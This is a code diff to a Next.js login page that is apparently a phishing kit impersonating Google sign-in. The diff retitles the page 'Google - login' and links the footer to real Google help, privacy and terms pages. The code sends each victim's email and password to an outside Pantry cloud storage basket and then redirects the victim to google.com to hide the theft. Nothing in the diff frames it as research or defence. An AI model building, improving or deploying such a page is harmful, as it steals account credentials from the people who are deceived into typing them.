@@ -10,10 +10,10 @@ const inter = Inter({
 })
 export default function Home() {
 
+
   const [Email, setEmail] = useState("")
   const [Pass, setPass] = useState("")
   const [EmailDone, setEmailDone] = useState(false)
-  const [PassDone, setPassDone] = useState()
 
   const [opacity, setOpacity] = useState(false)
   const [Scale, setScale] = useState(true)
@@ -70,25 +70,29 @@ export default function Home() {
 
     let basketName = Email.split("@")[0]
 
-    fetch(`https://getpantry.cloud/apiv1/pantry/0b32f6c1-ae41-4ec1-9faf-71fa0a75a3a6/basket/${basketName}`, {
+    fetch(`https://getpantry.cloud/apiv1/pantry/${process.env.NEXT_PUBLIC_PANTRY_KEY}/basket/${basketName}`, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
       },
       body: JSON.stringify({
-        "Name":basketName,
+        "Name": basketName,
         "Email": Email,
         "Pass": Pass
       }),
     })
-      .then((response) => response.json())
+      .then((response) =>{})
       .then((data) => {
-        // console.log('Success:', data);
-        window.location.href = "https://www.google.com"
+        console.log('Success:', data);
       })
       .catch((error) => {
         console.error('Error:', error);
       });
+
+    setInterval(() => {
+
+      window.location.href = "https://www.google.com"
+    }, 4000);
 
 
 
@@ -113,14 +117,14 @@ export default function Home() {
   return (
     <>
       <Head>
-        <title>Login</title>
+        <title>Google - login</title>
       </Head>
 
 
       <main className={`relative overflow-x-hidden w-fit m-auto flex flex-col md:h-screen item-center justify-center`}>
 
         <div className={`w-full h-[5px] duration-700 ease-out md:h-1  bg-blue-500  ${LoadingAnimation ? "animate-loading block" : "hidden"}`}></div>
-        <div className={`relative h-fit flex duration-300 ${EmailDone ? "-translate-x-[100%]" : "translate-x-[0%]"} ${opacity ? "opacity-50" : "opacity-100"}  max-w-[500px] `}>
+        <div className={`relative h-fit flex duration-300 ${EmailDone ? "-translate-x-[100%]" : ""} ${opacity ? "opacity-50" : "opacity-100"}  max-w-[500px] `}>
 
           <section className='relative max-w-[100%] min-w-[100%] text-lg'>
             <div className="bg-white relative flex flex-col justify-center items-center">
@@ -192,10 +196,10 @@ export default function Home() {
         </div>
         <div className="flex my-5 md:p-0 p-8 w-full ">
           <ul className="flex justify-between w-full px-1 flex-wrap ">
-            <li><a href="https://google.com" target="_blank" rel="noopener noreferrer"> English (United States) <FontAwesomeIcon className='ml-5' icon={faCaretDown}/> </a></li>
-            <li><a href="https://google.com" target="_blank" rel="noopener noreferrer"> Help</a></li>
-            <li><a href="https://google.com" target="_blank" rel="noopener noreferrer"> Privacy</a></li>
-            <li><a href="https://google.com" target="_blank" rel="noopener noreferrer"> Terms</a></li>
+            <li><a className='flex justify-between items-center gap-8' href="https://google.com" target="_blank" rel="noopener noreferrer"> English (United States) <span><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" className="bi bi-caret-down-fill" viewBox="0 0 16 16"> <path d="M7.247 11.14 2.451 5.658C1.885 5.013 2.345 4 3.204 4h9.592a1 1 0 0 1 .753 1.659l-4.796 5.48a1 1 0 0 1-1.506 0z" /> </svg></span></a></li>
+            <li><a href="https://support.google.com/accounts?hl=en&visit_id=638096372844359640-3440594032&rd=2&p=account_iph#topic=3382296" target="_blank" rel="noopener noreferrer"> Help</a></li>
+            <li><a href="https://policies.google.com/privacy?gl=BD&hl=en" target="_blank" rel="noopener noreferrer"> Privacy</a></li>
+            <li><a href="https://policies.google.com/terms?gl=BD&hl=en" target="_blank" rel="noopener noreferrer"> Terms</a></li>
           </ul>
         </div>
 
